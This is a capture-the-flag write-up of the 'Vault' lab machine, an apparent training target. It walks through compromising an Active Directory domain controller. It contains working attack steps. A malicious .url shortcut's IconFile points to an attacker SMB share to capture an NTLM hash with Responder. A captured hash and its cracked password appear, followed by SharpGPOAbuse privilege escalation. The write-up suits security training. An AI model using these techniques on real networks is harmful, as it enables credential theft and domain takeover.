# Vault
### Enumeration
```
# Nmap 7.92 scan initiated Sun May  8 14:01:56 2022 as: nmap -sCV -p- -v -oN nmap/tcp_all.out 192.168.202.172
Nmap scan report for vault.offsec (192.168.202.172)
Host is up (0.012s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-08 14:04:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Issuer: commonName=DC.vault.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-05-07T13:58:41
| Not valid after:  2022-11-06T13:58:41
| MD5:   94c0 74ef 8569 3813 eb60 0898 76de 29d7
|_SHA-1: bb39 772c bcda 36fa e1a3 8aa3 08b0 ec2a 8c6c 4725
| rdp-ntlm-info:
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-08T14:05:42+00:00
|_ssl-date: 2022-05-08T14:06:22+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49798/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

##### SMB
We have anonymous read/write access to a `DocumentsShare` share, with no contents. However, this means we can brute-force users using the `impacket-lookupsid` script:

```
$ impacket-lookupsid anonymous@192.168.202.172 -no-pass | grep TypeUser

500: VAULT\Administrator (SidTypeUser)
501: VAULT\Guest (SidTypeUser)
502: VAULT\krbtgt (SidTypeUser)
1000: VAULT\DC$ (SidTypeUser)
1103: VAULT\anirudh (SidTypeUser)
```

At this point, I couldn't find a way to make progress. I thought perhaps the document share was visited periodically by one of the users, so I uploaded a reverse shell payload, but it never got executed.

The hint for this part suggested uploading a shortcut file with the icon file pointing to an SMB share that we host. I tried the payload detailed in [this blog post](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/), listening for connections using `responder`:

```
sudo responder -v -I tun0
```

I waited for a while but got nothing. Googling a bit more, I found that a "shortcut file" could mean an `.lnk` file. I tried generating one using `pylnk3`:

```
pylnk3 c --icon '\\192.168.49.202\share\icon.ico' '\\192.168.49.202\share\file.doc'  evil.lnk
```

I uploaded it to the share, naming it `@evil.lnk` to put it at the top of the directory listing. Again, no luck.

In the end, I looked at the walkthrough, which said to use a `.url` file, so I constructed the malicious file:

```
[InternetShortcut]
URL=http://192.168.49.202/test
WorkingDirectory=.
IconFile=\\192.168.49.202\share\shortcut.icon
IconIndex=1
```

It's the `IconFile` part that triggers the user's NTLM hash to be sent to us. We get the hash below and crack it to give the password `SecureHM`.

```
anirudh::VAULT:a5bbfcb0641d8208:B4E41F5089FA664A4D9B74D23C7C1D86:010100000000000000FF87022063D801947BA5456FE1DE2E0000000002000800530051004C00530001001E00570049004E002D003200460042004B005700520059005A00590037004F0004003400570049004E002D003200460042004B005700520059005A00590037004F002E00530051004C0053002E004C004F00430041004C0003001400530051004C0053002E004C004F00430041004C0005001400530051004C0053002E004C004F00430041004C000700080000FF87022063D801060004000200000008003000300000000000000001000000002000001B898DAC5A5D0D98431AE6A160F57301D980DD48CBD559755DCD4AF5BE07242D0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340039002E003200300032000000000000000000:SecureHM
```

We can get a shell as `anirudh` using `evil-winrm`, and immediately grab the user flag. I uploaded and ran `SharpHound`, then downloaded the zip file and put it into BloodHound.

This showed that `anirudh` has `GenericWrite` on the `Default Domain Policy` group policy object (GPO). This GPO is applied to the entire `vault.offsec` domain, meaning we should be able to add `anirudh` to the local admin group.

We can use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to add `anirudh` to the local administrators group (precompiled binaries available [here](https://github.com/Flangvik/SharpCollection)):

```
.\SharpGPOAbuse.exe --addlocaladmin --useraccount anirudh --gponame 'Default Domain Policy'
```

Then we need to reload group policies:

```
gpupdate /force
```

Then exit and reload `evil-winrm`, and when we run `whoami /groups`, we see we're now a member of `BUILTIN\Administrators`, and we can grab the root flag.